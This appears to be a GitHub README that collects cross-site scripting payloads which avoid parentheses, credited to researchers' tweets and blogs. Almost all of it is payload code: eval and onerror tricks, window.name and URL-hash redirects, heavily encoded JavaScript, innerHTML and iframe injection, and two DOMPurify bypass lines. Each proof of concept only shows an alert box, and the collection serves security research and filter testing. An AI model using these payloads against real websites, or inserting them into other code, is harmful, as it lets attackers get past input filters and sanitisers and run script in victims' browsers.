# XSS Without parentheses () 


### This repo contains XSS payloads that doesn't require parentheses, collected from tweets, blogs...
### All the POC's are alert box with number 23

---
    alert`23`
---
    window.name="javascript:alert(23)";
    location="xss.html";
xss.html

    location=name

---

[Cure53](https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml#level-2)


    eval.call`${'alert\x2823\x29'}`


---

[Renwa](https://twitter.com/RenwaX23)


    eval.apply`${[`alert\x2823\x29`]}`
    
---

[Bo0oM](https://twitter.com/i_bo0om/status/687652257609957376)


    setTimeout`alert\x2823\x29`
    setInterval`alert\x2823\x29`
    
---

[Garethheyes](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/)

    onerror=alert;throw 23;

---

[Garethheyes](https://twitter.com/garethheyes/status/1408510651321012227?)

    var{haha:onerror=alert}=0;throw 1
    var{a:onerror}={a:alert};throw 1

---

[Garethheyes](https://twitter.com/garethheyes/status/1128974215682637825)

    'alert\x2823\x29'instanceof{[Symbol.hasInstance]:eval}

---
Only Chrome [Garethheyes](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/)

    onerror=eval;throw'=alert\x2823\x29';
    
---

[Garethheyes](https://twitter.com/garethheyes/status/1126526480614416395)

    {onerror=alert}throw 23

----

Only Firefox [h43z](https://twitter.com/h43z)

    throw onerror=eval,SyntaxError`alert\x2823\x29` 

----

Only Firefox [h43z](https://twitter.com/h43z)

    throw onerror=eval,Error`alert\x2843\x29`

----

[Garethheyes](https://portswigger.net/research/executing-non-alphanumeric-javascript-without-parenthesis)

    [][[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][!+[]+!+[]+!+[]]+[[]+{}][+[]][+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[![]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[!![]+[]][+[]][+!+[]]+[[][[]]+[]][+[]][+[]]+[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[[]+{}][+[]][+!+[]]+[!![]+[]][+[]][+!+[]]][[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][!+[]+!+[]+!+[]]+[[]+{}][+[]][+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[![]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[!![]+[]][+[]][+!+[]]+[[][[]]+[]][+[]][+[]]+[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[[]+{}][+[]][+!+[]]+[!![]+[]][+[]][+!+[]]]`$${[!{}+[]][+[]][+!+[]]+[!{}+[]][+[]][+!+[]+!+[]]+[!{}+[]][+[]][+!+[]+!+[]+!+[]+!+[]]+[!![]+[]][+[]][+!+[]]+[!![]+[]][+[]][+[]]+[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]][+[]]+[[][[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[[][[]]+[]][+[]][!+[]+!+[]]]+[]][+[]][+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]}$```//Function(alert(1))

----

[terjanq](https://twitter.com/terjanq/status/1126614389371621378)

xss_redir.html
```
window.name='1;var Uncaught=1;alert(23)';
location='xss_short.html';
```
xss_short.html
```
{onerror=eval}throw/0/+name
```

---

[terjanq](https://twitter.com/terjanq/status/1286059146509516800)
    
    example.com/#1/-alert(23)/
```    
onhashchange=setTimeout;
Object.prototype.toString=RegExp.prototype.toString;
Object.prototype.source=location.hash;
location.hash=null;
```
    
---

[terjanq](https://twitter.com/terjanq/status/1126796552960389120)

    throw/a/,Uncaught=1,g=alert,a=g+0,onerror=eval,/1/g+a[14]+[23,331,337]+a[15]
    
---

[terjanq](https://twitter.com/terjanq)

    window.name="alert(23)";
    location="xss.html";
xss.html

    Function`a${name}```
    
---

[terjanq](https://twitter.com/terjanq)

Put `%0aalert(/23/)//` anywhere in the URL

    location='javascript:'+location
    location=/javascript:/.source+location
    location=`javascript:`+location
    
---

[terjanq](https://twitter.com/terjanq)

```
x={...eval+0,toString:Array.prototype.shift,length:15},
x+x+x+x+x+x+x+x+x+x+x+x+x,
location = /javascript:/.source + alert.name+x+23+x
```
    
---

[terjanq](https://twitter.com/terjanq/status/1239617536318152704?s=20)

    
    example.com/xss?%0aalert(/23/)//
    

    Function`a${unescape. call`${location}`}```
    
---

[aemkei](https://twitter.com/aemkei)

    onhashchange=setTimeout;
    HashChangeEvent.prototype.toString=
    RegExp.prototype.toString;
    location.hash=
    HashChangeEvent.prototype.source=
    '1/-alert\5023\51/';
    
---

[aemkei](https://twitter.com/aemkei/status/1291104722875830274?s=20)

    onload=setTimeout
    Event.prototype.toString=
    _=>"alert\5023\51"
    
---

[aemkei](https://twitter.com/aemkei/status/1290768241225326595?s=20)

    throw/**/Uncaught=window.onerror=eval,&quot;;alert\5023\51&quot;
    
---

[Gareth Heyes](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

```
x=new DOMMatrix;
matrix=alert;
x.a=23;
location='javascript'+':'+x
```
    
--- 

[BitK](https://twitter.com/BitK_/status/1239581718635479041)

    Function`a${`alert${Function`a${`return fromCharCode`}{fromCharCode}``${String}``40`}23${Function`a${`return fromCharCode`}{fromCharCode}``${String}``41`}`}```
    
--- 

[BitK](https://twitter.com/BitK_/status/1298225144234729473)

    range = document.createRange``; 
    range.createContextualFragment`<img src=x onerror=alert\x2823\x29>'`;
    
--- 

[BitK](https://twitter.com/BitK_/status/1239620001776185344?)

    Function`a${`${Function`a${`return from`}{from}``${Array}``96${Function`a${`return fromCharCode`}{fromCharCode}``${String}`}`}${Function`a${`return fromCharCode`}{fromCharCode}``${String}``${96}${10}${97}${108}${101}${114}${116}${40}${50}${51}${41}`}`}```

    
--- 


[albinowax](https://github.com/cure53/XSSChallengeWiki/wiki/ES6-Challenge)

    window.name="alert(23)"
    location="xss.html"
    
xss.html

    eval.constructor`eval\x28name\x29```
    
--- 

[hasegawayosuke](https://github.com/cure53/XSSChallengeWiki/wiki/ES6-Challenge)

    window.name="alert(23)"
    location="xss.html"
    
xss.html

    [].every.call`eval\x28name\x29${eval}`
    
---

[Tomer Zait](https://twitter.com/realgam3/status/1298290461371662337)

    []["filter"]["constructor"]`alert\x2823\x29```
    
---

[Pepe Vila](https://twitter.com/cgvwzq)

    Array.prototype[Symbol.hasInstance]=eval;
    "alert\x2823\x29" instanceof [];
    
---


[RootEval](https://twitter.com/RootEval)

    x='javascript:alert\x2823\x29';x={x:location}=this
    
---

[iwasakinoriaki](https://github.com/cure53/XSSChallengeWiki/wiki/ES6-Challenge)

    window.name="alert(23)"
    location="xss.html"
    
xss.html

    eval.call`${top.name}`
    
---

[Cure53](https://github.com/cure53/XSSChallengeWiki/wiki/ES6-Challenge)

    window.name="<img src=x onerror=alert(23)>"
    location="xss.html"
    
xss.html

    document.write`${top.name}`
    
---

[mage_1868 ](https://github.com/cure53/XSSChallengeWiki/wiki/ES6-Challenge)

    location="https://example.com/xss.html/.source;alert(23)?xss="
    
example.com

    eval.call`${location.pathname}`
    
---

Only Firefox [Garethheyes](https://twitter.com/garethheyes/status/1126922526796468224)
          
    {onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:'',message:'alert\x2823\x29'}
---

[ycam](https://twitter.com/ycam_asafety/status/1126976315666706433)

```
example.com/xss#*/;alert(23);
```
```
throw/**/onerror=Uncaught=eval,e={lineNumber:1,columnNumber:1,fileName:'',message:'/*'+location.hash},typeof/**/InstallTrigger!='undefined'?e:e.message
```
---
[cgvwzq](https://twitter.com/cgvwzq/status/1126994744268267527)

[https://demo.vwzq.net/lol.html](https://demo.vwzq.net/lol.html)

```
<script/id=Uncaught>

// chrome + firefox

throw[onerror=eval][e=[x='+alert\x2823\x29']]=0[e.lineNumber=e.columnNumber=e.fileName=e.message=x]=e

</script>

<script>

// firefox

onhashchange=setTimeout,HashChangeEvent.prototype[Symbol.toStringTag]='+alert\x2823\x29',location.hash=1

</script>

<script>

// chrome + firefox

Array.prototype[Symbol.hasInstance]=eval,'alert\x2823\x29'instanceof[]

</script>

<script>

// chrome

[onerror=eval][TypeError.prototype.name='=/']['/-alert\x2823\x29//']

</script>


<script>

// chrome

onerror=eval,ReferenceError.prototype.name='=alert\x2823\x29//',lol

</script>
```

---

[physuru](https://physuru.dev/blog/restricted_character_xss/)

```
elem=new Option
elem.classList.valueOf=String.prototype.charAt

elem.innerText=elem.outerHTML
elem.className=elem.innerHTML
amp=Object.__proto__.name+elem.classList

htag=new Text
elem.className=htag.nodeName
htag=Object.__proto__.name+elem.classList

elem.innerHTML=amp+htag+97
a=elem.innerText
elem.innerHTML=amp+htag+99
c=elem.innerText
elem.innerHTML=amp+htag+105
i=elem.innerText
elem.innerHTML=amp+htag+106
j=elem.innerText
elem.innerHTML=amp+htag+112
p=elem.innerText
elem.innerHTML=amp+htag+114
r=elem.innerText
elem.innerHTML=amp+htag+115
s=elem.innerText
elem.innerHTML=amp+htag+116
t=elem.innerText
elem.innerHTML=amp+htag+118
v=elem.innerText

elem.innerHTML=amp+htag+58
colon=elem.innerText

elem.innerHTML=amp+htag+40
lpar=elem.innerText
elem.innerHTML=amp+htag+41
rpar=elem.innerText

location=j+a+v+a+s+c+r+i+p+t+colon+alert.name+lpar+1+rpar
```
---
[Renwa](https://twitter.com/RenwaX23/status/1126999364763832325)

```
document.body.innerHTML="\u003cimg src=x onerror=alert\u002823\u0029\u003e";
```
    
---
[Renwa](https://twitter.com/RenwaX23)

```
document.body.innerHTML="&ltimg src=x onerror=alert&lpar;23&rpar;&gt"
document.body.innerHTML=document.body.innerText
```
---
If the page is frameable [Renwa](https://twitter.com/RenwaX23/status/1125387416175546368)

```
data:text/html,<iframe name="<svg/onload=alert(23)>" src="http://example.com/xss?document.body.innerHTML=name">
```
---
[user00239123](https://stackoverflow.com/a/40899496/9216926)

    document.location='javascript:alert%2823%29'

---
Only IE [matt](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/#comment-2157)
   
    example.com/xss#<img src=x onerror=alert(23)>
    
    document.body.innerHTML=location.hash;
---
[Brutelogic](https://twitter.com/brutelogic/status/585944389589065728)
    
    <svg/onload='alert&#40 23 &#41'> 

---
[Blakils](https://twitter.com/Blaklis_/status/1125663871056928769)

    location=/javascript:alert%2823%29/.source;
---
[Nicocanicolas](https://twitter.com/nicocanicolas/status/1125399154560307205)

    http://example.com/?test=&lt;img/src=&quot;x&quot;/onerror=alert(23)&gt;
    
    document.body.innerHTML=location.search;
    document.body.innerHTML=document.body.innerText;

---

# With Script Gadgets 

Using Prorotype Pollution [PP Gadgets Repo](https://github.com/BlackFan/client-side-prototype-pollution#script-gadgets)

---

DOMPurify Bypass [Parrot](https://twitter.com/parrot409)

    delete DOMPurify.isSupported

---

DOMPurify Bypass [hakatashi](https://hackmd.io/@hakatashi/HkgG02U4t)

    delete document.implementation.__proto__.createHTMLDocument

---

### Anything: @[RenwaX23](https://twitter.com/RenwaX23)
